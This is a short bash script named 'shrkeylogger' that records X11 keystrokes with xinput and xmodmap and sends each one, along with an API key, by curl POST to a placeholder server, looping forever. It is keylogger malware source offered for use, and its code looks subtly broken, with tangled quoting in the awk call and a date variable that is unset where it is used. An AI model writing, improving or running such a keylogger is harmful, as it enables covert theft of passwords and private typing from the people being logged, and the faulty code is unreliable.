# shrkeylogger
#!/bin/bash

# Server details
SERVER_URL="https://yourserver.com/keylogger"
API_KEY="yourapikey"

# Function to log keystrokes
log_keystrokes() {
    # Log the keystrokes to a file
    xinput test-xi2 --root | awk -v date="$(date +'%Y-%m-%d %H:%M:%S')" '
        /^EVENT type 3 \(KeyPress\)/ {
            keycode = $NF
            system("xmodmap -pke | grep -A1 '"'"'"'"$keycode"'"'"'"' | tail -1 | cut -d'"'"'"'" = '"'"'"' -f2")
        }
    ' | while read -r key; do
        # Send the logged keystrokes to the server
        curl -X POST -H "Content-Type: application/json" -d '{"api_key": "'"$API_KEY"'", "log": "'"$date $key"'"}' "$SERVER_URL"
    done
}

# Check if the keylogger is already running
if pgrep -f "$0" > /dev/null; then
    echo "Keylogger is already running."
    exit 1
fi

# Run the keylogger function indefinitely
while true; do
    log_keystrokes
    sleep 1
done
